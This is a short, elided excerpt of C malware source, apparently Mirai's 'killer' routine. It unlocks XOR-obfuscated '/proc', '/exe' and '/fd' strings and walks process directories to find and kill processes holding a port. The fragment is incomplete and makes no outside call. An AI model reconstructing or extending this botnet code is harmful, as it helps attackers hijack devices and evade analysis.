...
BOOL killer_kill_by_port(port_t port)
{
    ...
    table_unlock_val(XOR_PROC);
    table_unlock_val(XOR_EXE);
    table_unlock_val(XOR_FD);
...
#endif
        table_lock_val(XOR_PROC);
        table_lock_val(XOR_EXE);
        table_lock_val(XOR_FD);
    ...
    if ((dir = opendir(table_retrieve_val(XOR_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            ...
            util_strcpy(ptr_path, table_retrieve_val(XOR_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(XOR_EXE, NULL));
            ...
            util_strcpy(ptr_path, table_retrieve_val(XOR_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(XOR_FD, NULL));
